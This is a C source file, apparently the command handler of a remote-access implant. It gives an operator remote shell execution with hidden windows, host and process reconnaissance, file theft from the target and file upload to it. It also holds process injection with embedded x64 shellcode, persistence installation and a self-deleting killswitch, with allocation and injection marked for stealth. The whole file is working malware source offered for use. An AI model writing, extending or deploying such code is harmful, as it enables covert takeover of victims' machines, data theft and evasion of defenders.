/*
 * Command Implementation - Real functionality
 */

#include "commands.h"
#include "utils.h"
#include "config.h"
#include "../inject/inject_core.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifdef PLATFORM_WINDOWS
    #include <windows.h>
    #include <tlhelp32.h>
    #include <psapi.h>
#else
    #include <unistd.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <sys/stat.h>
    #include <sys/utsname.h>
    #include <fcntl.h>
    #include <dirent.h>
    #include <signal.h>
#endif

// Command table
static const command_t g_commands[] = {
    {CMD_PING, "ping", cmd_ping, 0},
    {CMD_EXEC, "exec", cmd_exec, 0},
    {CMD_SYSINFO, "sysinfo", cmd_sysinfo, 0},
    {CMD_PS_LIST, "ps", cmd_ps_list, 0},
    {CMD_SHELL, "shell", cmd_shell, 0},
    {CMD_DOWNLOAD, "download", cmd_download, 0},
    {CMD_UPLOAD, "upload", cmd_upload, 0},
    {CMD_INJECT, "inject", cmd_inject, 0},
    {CMD_PERSIST, "persist", cmd_persist, 0},
    {CMD_KILLSWITCH, "killswitch", cmd_killswitch, 0},
    {CMD_NOP, NULL, NULL, 0}
};

// Execute command by ID
int execute_command(command_id_t cmd_id, const uint8_t* args, size_t args_len,
                   uint8_t* output, size_t* output_len) {
    // Find command handler
    for (int i = 0; g_commands[i].handler; i++) {
        if (g_commands[i].id == cmd_id) {
            return g_commands[i].handler(args, args_len, output, output_len);
        }
    }
    
    // Unknown command
    const char* msg = "Unknown command";
    size_t msg_len = str_len(msg);
    if (*output_len >= msg_len) {
        mem_cpy(output, msg, msg_len);
        *output_len = msg_len;
    }
    return ERR_NOT_FOUND;
}

// Ping command
int cmd_ping(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    (void)args;
    (void)args_len;
    
    const char* msg = "PONG";
    size_t msg_len = str_len(msg);
    
    if (*output_len >= msg_len) {
        mem_cpy(output, msg, msg_len);
        *output_len = msg_len;
        return ERR_SUCCESS;
    }
    
    return ERR_INVALID_PARAM;
}

// Execute system command
int cmd_exec(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    if (!args || args_len == 0) {
        return ERR_INVALID_PARAM;
    }
    
    // Ensure null-terminated command
    char* cmd = (char*)stealth_alloc(args_len + 1);
    if (!cmd) {
        return ERR_OUT_OF_MEMORY;
    }
    
    mem_cpy(cmd, args, args_len);
    cmd[args_len] = '\0';
    
    int result;
    
#ifdef PLATFORM_WINDOWS
    // Windows implementation
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    
    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return ERR_UNKNOWN;
    }
    
    STARTUPINFOA si = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {0};
    
    char cmdline[512];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return ERR_UNKNOWN;
    }
    
    CloseHandle(hWritePipe);
    
    // Read output
    DWORD bytesRead;
    DWORD totalBytes = 0;
    char buffer[1024];
    
    while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        if (totalBytes + bytesRead <= *output_len) {
            mem_cpy(output + totalBytes, buffer, bytesRead);
            totalBytes += bytesRead;
        } else {
            break;
        }
    }
    
    *output_len = totalBytes;
    
    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    result = ERR_SUCCESS;
    
#else
    // Linux/Unix implementation
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        return ERR_UNKNOWN;
    }
    
    pid_t pid = fork();
    if (pid == -1) {
        close(pipefd[0]);
        close(pipefd[1]);
        return ERR_UNKNOWN;
    }
    
    if (pid == 0) {
        // Child process
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        
        execl("/bin/sh", "sh", "-c", cmd, NULL);
        _exit(127);
    }
    
    // Parent process
    close(pipefd[1]);
    
    size_t total_read = 0;
    ssize_t bytes_read;
    
    while ((bytes_read = read(pipefd[0], output + total_read, 
                             *output_len - total_read)) > 0) {
        total_read += bytes_read;
        if (total_read >= *output_len) {
            break;
        }
    }
    
    close(pipefd[0]);
    
    int status;
    waitpid(pid, &status, 0);
    
    *output_len = total_read;
    result = ERR_SUCCESS;
#endif
    
    return result;
}

// Get system information
int cmd_sysinfo(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    (void)args;
    (void)args_len;
    
    char info[1024];
    int len = 0;
    
#ifdef PLATFORM_WINDOWS
    // Windows system info
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    
    char computer[256] = {0};
    char username[256] = {0};
    DWORD size = sizeof(computer);
    GetComputerNameA(computer, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);
    
    OSVERSIONINFOA osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA(&osvi);
    
    len = snprintf(info, sizeof(info),
        "OS: Windows %lu.%lu Build %lu\n"
        "Computer: %s\n"
        "User: %s\n"
        "CPUs: %lu\n"
        "Memory: %llu MB\n"
        "Architecture: %s\n",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        computer, username,
        si.dwNumberOfProcessors,
        ms.ullTotalPhys / (1024 * 1024),
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86"
    );
    
#else
    // Linux/Unix system info
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    
    struct utsname un;
    uname(&un);
    
    long pages = sysconf(_SC_PHYS_PAGES);
    long page_size = sysconf(_SC_PAGE_SIZE);
    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
    
    char* username = getenv("USER");
    if (!username) username = "unknown";
    
    len = snprintf(info, sizeof(info),
        "OS: %s %s\n"
        "Computer: %s\n"
        "User: %s\n"
        "CPUs: %ld\n"
        "Memory: %ld MB\n"
        "Architecture: %s\n",
        un.sysname, un.release,
        hostname, username,
        cpus,
        (pages * page_size) / (1024 * 1024),
        un.machine
    );
#endif
    
    if (len > 0 && len < *output_len) {
        mem_cpy(output, info, len);
        *output_len = len;
        return ERR_SUCCESS;
    }
    
    return ERR_INVALID_PARAM;
}

// List processes
int cmd_ps_list(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    (void)args;
    (void)args_len;
    
    char* buf = (char*)output;
    size_t written = 0;
    size_t max_len = *output_len;
    
#ifdef PLATFORM_WINDOWS
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return ERR_UNKNOWN;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            int len = snprintf(buf + written, max_len - written,
                             "%5lu  %5lu  %s\n",
                             pe32.th32ProcessID,
                             pe32.th32ParentProcessID,
                             pe32.szExeFile);
            
            if (len > 0 && written + len < max_len) {
                written += len;
            } else {
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    
#else
    // Linux implementation
    DIR* dir = opendir("/proc");
    if (!dir) {
        return ERR_UNKNOWN;
    }
    
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        // Check if directory name is a PID
        char* endptr;
        long pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0') continue;
        
        // Read process info
        char path[256];
        snprintf(path, sizeof(path), "/proc/%ld/stat", pid);
        
        int fd = open(path, O_RDONLY);
        if (fd < 0) continue;
        
        char stat_buf[1024];
        ssize_t n = read(fd, stat_buf, sizeof(stat_buf) - 1);
        close(fd);
        
        if (n > 0) {
            stat_buf[n] = 0;
            
            // Parse comm (process name)
            char* comm_start = strchr(stat_buf, '(');
            char* comm_end = strrchr(stat_buf, ')');
            
            if (comm_start && comm_end && comm_end > comm_start) {
                *comm_end = 0;
                comm_start++;
                
                // Parse ppid (parent PID)
                char* p = comm_end + 2;
                char state;
                long ppid;
                sscanf(p, "%c %ld", &state, &ppid);
                
                int len = snprintf(buf + written, max_len - written,
                                 "%5ld  %5ld  %s\n",
                                 pid, ppid, comm_start);
                
                if (len > 0 && written + len < max_len) {
                    written += len;
                } else {
                    break;
                }
            }
        }
    }
    
    closedir(dir);
#endif
    
    *output_len = written;
    return ERR_SUCCESS;
}

// Shell command
int cmd_shell(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    // Just redirect to exec for now
    return cmd_exec(args, args_len, output, output_len);
}

// Process enumeration
int enumerate_processes(process_info_t** processes, size_t* count) {
    *processes = NULL;
    *count = 0;
    
#ifdef PLATFORM_WINDOWS
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return ERR_UNKNOWN;
    }
    
    // Count processes first
    size_t proc_count = 0;
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            proc_count++;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    // Allocate array
    *processes = (process_info_t*)stealth_alloc(sizeof(process_info_t) * proc_count);
    if (!*processes) {
        CloseHandle(hSnapshot);
        return ERR_OUT_OF_MEMORY;
    }
    
    // Fill array
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe32)) {
        size_t i = 0;
        do {
            (*processes)[i].pid = pe32.th32ProcessID;
            (*processes)[i].ppid = pe32.th32ParentProcessID;
            strncpy((*processes)[i].name, pe32.szExeFile, sizeof((*processes)[i].name) - 1);
            i++;
        } while (Process32Next(hSnapshot, &pe32) && i < proc_count);
        *count = i;
    }
    
    CloseHandle(hSnapshot);
    
#else
    // Linux: Parse /proc
    DIR* dir = opendir("/proc");
    if (!dir) {
        return ERR_UNKNOWN;
    }
    
    // Count processes first (rough estimate)
    size_t capacity = 256;
    *processes = (process_info_t*)stealth_alloc(sizeof(process_info_t) * capacity);
    if (!*processes) {
        closedir(dir);
        return ERR_OUT_OF_MEMORY;
    }
    
    struct dirent* entry;
    size_t i = 0;
    
    while ((entry = readdir(dir)) != NULL && i < capacity) {
        char* endptr;
        long pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0') continue;
        
        (*processes)[i].pid = pid;
        (*processes)[i].ppid = 0;  // Would need to parse /proc/PID/stat
        snprintf((*processes)[i].name, sizeof((*processes)[i].name),
                "Process_%ld", pid);
        i++;
    }
    
    *count = i;
    closedir(dir);
#endif
    
    return ERR_SUCCESS;
}

// Get current process ID
int get_current_process_id(void) {
#ifdef PLATFORM_WINDOWS
    return GetCurrentProcessId();
#else
    return getpid();
#endif
}

// Additional command implementations for completeness

// Download file from target
int cmd_download(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    if (!args || args_len == 0) {
        return ERR_INVALID_PARAM;
    }
    
    char filepath[512];
    size_t path_len = (args_len < sizeof(filepath) - 1) ? args_len : sizeof(filepath) - 1;
    mem_cpy(filepath, args, path_len);
    filepath[path_len] = '\0';
    
    // Try to read file
    FILE* fp = fopen(filepath, "rb");
    if (!fp) {
        const char* err = "File not found";
        mem_cpy(output, err, str_len(err));
        *output_len = str_len(err);
        return ERR_NOT_FOUND;
    }
    
    // Read file content
    size_t read_len = fread(output, 1, *output_len, fp);
    fclose(fp);
    
    *output_len = read_len;
    return ERR_SUCCESS;
}

// Upload file to target
int cmd_upload(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    if (!args || args_len < 2) {
        return ERR_INVALID_PARAM;
    }
    
    // Parse filepath and data
    // Format: [filename_len:1][filename][data]
    uint8_t filename_len = args[0];
    if (filename_len >= args_len) {
        return ERR_INVALID_PARAM;
    }
    
    char filepath[256];
    mem_cpy(filepath, args + 1, filename_len);
    filepath[filename_len] = '\0';
    
    const uint8_t* file_data = args + 1 + filename_len;
    size_t data_len = args_len - 1 - filename_len;
    
    // Write file
    FILE* fp = fopen(filepath, "wb");
    if (!fp) {
        const char* err = "Cannot create file";
        mem_cpy(output, err, str_len(err));
        *output_len = str_len(err);
        return ERR_ACCESS_DENIED;
    }
    
    size_t written = fwrite(file_data, 1, data_len, fp);
    fclose(fp);
    
    // Return success message
    char msg[256];
    int len = snprintf(msg, sizeof(msg), "Uploaded %zu bytes to %s", written, filepath);
    if (len > 0 && (size_t)len < *output_len) {
        mem_cpy(output, msg, len);
        *output_len = len;
    }
    
    return ERR_SUCCESS;
}

// Process injection implementation  
int cmd_inject(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    
    if (args_len < sizeof(uint32_t) + 1) {
        const char* err = "Usage: inject <pid> <technique> [payload]";
        mem_cpy(output, err, str_len(err));
        *output_len = str_len(err);
        return ERR_INVALID_PARAM;
    }
    
    // Parse arguments
    uint32_t target_pid = *(uint32_t*)args;
    uint8_t technique = args[sizeof(uint32_t)];
    
    // Default payload (calc.exe or /bin/sh)
    uint8_t default_payload[] = {
        #ifdef PLATFORM_WINDOWS
            // Windows x64 shellcode to execute calc.exe
            0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff,
            0x48, 0x8d, 0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x7d,
            0x33, 0x82, 0x0e, 0xbf, 0x6a, 0xe1, 0x5f, 0x48, 0x31, 0x58,
            0x27, 0x48, 0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0x81,
            0x5b, 0x01, 0xea, 0x4f, 0x82, 0x21, 0x5f, 0x7d, 0x33, 0xc3,
            0x5e, 0xfe, 0x3a, 0xb3, 0x0e, 0x2b, 0x5b, 0xb3, 0xdc, 0xda,
            0x22, 0x6a, 0x0d, 0x1d, 0x5b, 0x09, 0x5c, 0xa7, 0x22, 0x6a,
            0x0d, 0x5d, 0x5b, 0x09, 0x7c, 0xef, 0x22, 0x4e, 0xe8, 0x37,
            0x7a, 0xca, 0x47, 0x34, 0x22, 0xd5, 0x96, 0x3f, 0x72, 0xd0,
            0xc6, 0xb6, 0x2b, 0xc1, 0x1e, 0x35, 0x0a, 0xcb, 0x56, 0x7e,
            0xab, 0x84, 0xd4, 0xf3, 0xc3, 0x46, 0xc7, 0x2b, 0x91, 0x17,
            0x7c, 0x72, 0xca, 0x47, 0x34, 0x22, 0xd5, 0x96, 0xb2, 0x72,
            0x46, 0x82, 0x2a, 0x4f, 0x17, 0x7b, 0x2e, 0x16, 0xce, 0x31,
            0xe6, 0xea, 0x68, 0x94, 0xf6, 0xa9, 0x13, 0xf4, 0x52, 0xd2,
            0x4f, 0xf7, 0x3a, 0xa9, 0x07, 0xc4, 0x7b, 0xb3, 0xdc, 0xda,
            0x22, 0x6a, 0x0d, 0x1d, 0x72, 0xc3, 0x87, 0xb7, 0x22, 0xa0,
            0x1e, 0x7d, 0x7b, 0x50, 0x46, 0xf7, 0x7c, 0xe5, 0xd6, 0x2c,
            0x6a, 0xce, 0x5f, 0x34, 0x6a, 0xa9, 0x1e, 0x7c, 0xcc, 0xca,
            0x5f, 0x34, 0xad, 0xa8, 0x17, 0xf6, 0xf2, 0xca, 0x5f, 0xb6,
            0x7c, 0xa8, 0x5a, 0xe7, 0x22, 0x4e, 0xe8, 0x3c, 0x0a, 0xca,
            0x4f, 0x37, 0x62, 0xe5, 0xa5, 0x82, 0xcc, 0xda, 0x46, 0xe7,
            0x88, 0x7a, 0xa0
        #else
            // Linux x64 shellcode to execute /bin/sh
            0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e,
            0x2f, 0x73, 0x68, 0x53, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x31,
            0xf6, 0x0f, 0x05
        #endif
    };
    
    // Setup injection configuration
    inject_config_t config = {0};
    config.target_pid = target_pid;
    config.technique = (inject_technique_t)technique;
    config.flags = INJECT_FLAG_STEALTH | INJECT_FLAG_CLEANUP;
    
    // Use provided payload or default
    if (args_len > sizeof(uint32_t) + 1) {
        config.payload = (uint8_t*)(args + sizeof(uint32_t) + 1);
        config.payload_size = args_len - sizeof(uint32_t) - 1;
    } else {
        config.payload = default_payload;
        config.payload_size = sizeof(default_payload);
    }
    
    // Initialize injection framework
    inject_status_t status = inject_init();
    if (status != INJECT_SUCCESS) {
        const char* err = "Failed to initialize injection framework";
        mem_cpy(output, err, str_len(err));
        *output_len = str_len(err);
        return -1;  // Generic error
    }
    
    // Execute injection
    status = inject_execute(&config);
    
    // Cleanup
    inject_cleanup();
    
    // Return result
    if (status == INJECT_SUCCESS) {
        const char* msg = "Injection successful";
        mem_cpy(output, msg, str_len(msg));
        *output_len = str_len(msg);
        return ERR_SUCCESS;
    } else {
        char msg[256];
        int len = snprintf(msg, sizeof(msg), "Injection failed: %s", 
                          inject_status_to_string(status));
        mem_cpy(output, msg, len);
        *output_len = len;
        return -1;  // Generic error
    }
}

// Install persistence
int cmd_persist(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    (void)args;
    (void)args_len;
    
    int result = ERR_SUCCESS;
    
#ifdef PLATFORM_WINDOWS
    result = install_persistence_windows();
#elif defined(PLATFORM_LINUX)
    result = install_persistence_linux();
#else
    result = ERR_NOT_FOUND;
#endif
    
    const char* msg = (result == ERR_SUCCESS) ? 
        "Persistence installed successfully" : 
        "Failed to install persistence";
    
    size_t msg_len = str_len(msg);
    mem_cpy(output, msg, msg_len);
    *output_len = msg_len;
    
    return result;
}

// Self-destruct / killswitch
int cmd_killswitch(const uint8_t* args, size_t args_len, uint8_t* output, size_t* output_len) {
    (void)args;
    (void)args_len;
    (void)output;
    (void)output_len;
    
    // Delete self
    char self_path[512];
    
#ifdef PLATFORM_LINUX
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len > 0) {
        self_path[len] = '\0';
        unlink(self_path);
    }
#endif
    
    // Exit process
    exit(0);
    
    return ERR_SUCCESS;  // Never reached
}